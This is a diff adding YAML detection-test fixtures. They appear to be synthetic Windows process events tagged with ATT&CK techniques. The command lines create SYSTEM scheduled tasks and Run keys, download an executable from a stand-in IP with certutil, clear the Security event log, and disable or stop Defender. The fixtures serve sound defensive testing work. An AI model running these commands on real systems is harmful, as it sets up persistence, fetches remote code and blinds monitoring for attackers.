@@ -1,0 +1,65 @@
+id: SC-W-020
+name: Scheduled task pointing at C:\Users\Public
+technique: T1053.005
+tactic: persistence
+logsource: { category: process_creation, product: windows }
+events:
+  - Image: 'C:\Windows\System32\schtasks.exe'
+    CommandLine: 'schtasks.exe /create /tn Updater /tr C:\Users\Public\up.exe /sc onlogon /ru SYSTEM'
+    ParentImage: 'C:\Windows\System32\cmd.exe'
+    User: 'NT AUTHORITY\SYSTEM'
+---
+id: SC-W-021
+name: Run key value added with reg.exe
+technique: T1547.001
+tactic: persistence
+logsource: { category: process_creation, product: windows }
+events:
+  - Image: 'C:\Windows\System32\reg.exe'
+    CommandLine: 'reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Helper /d C:\Users\Public\a.exe /f'
+    ParentImage: 'C:\Windows\System32\cmd.exe'
+    User: 'CORP\jsmith'
+---
+id: SC-W-022
+name: certutil downloads an executable
+technique: T1105
+tactic: command_and_control
+logsource: { category: process_creation, product: windows }
+events:
+  - Image: 'C:\Windows\System32\certutil.exe'
+    CommandLine: 'certutil.exe -urlcache -split -f http://198.51.100.7/a.exe C:\Users\Public\a.exe'
+    ParentImage: 'C:\Windows\System32\cmd.exe'
+    User: 'CORP\jsmith'
+---
+id: SC-W-023
+name: Security event log cleared with wevtutil
+technique: T1070.001
+tactic: defense_evasion
+logsource: { category: process_creation, product: windows }
+events:
+  - Image: 'C:\Windows\System32\wevtutil.exe'
+    CommandLine: 'wevtutil.exe cl Security'
+    ParentImage: 'C:\Windows\System32\cmd.exe'
+    User: 'CORP\admin2'
+---
+id: SC-W-024
+name: Defender real-time monitoring disabled via PowerShell
+technique: T1562.001
+tactic: defense_evasion
+logsource: { category: process_creation, product: windows }
+events:
+  - Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+    CommandLine: 'powershell.exe -c "Set-MpPreference -DisableRealtimeMonitoring $true"'
+    ParentImage: 'C:\Windows\System32\cmd.exe'
+    User: 'NT AUTHORITY\SYSTEM'
+---
+id: SC-W-025
+name: Defender service stopped with sc.exe
+technique: T1562.001
+tactic: defense_evasion
+logsource: { category: process_creation, product: windows }
+events:
+  - Image: 'C:\Windows\System32\sc.exe'
+    CommandLine: 'sc.exe stop WinDefend'
+    ParentImage: 'C:\Windows\System32\cmd.exe'
+    User: 'NT AUTHORITY\SYSTEM'
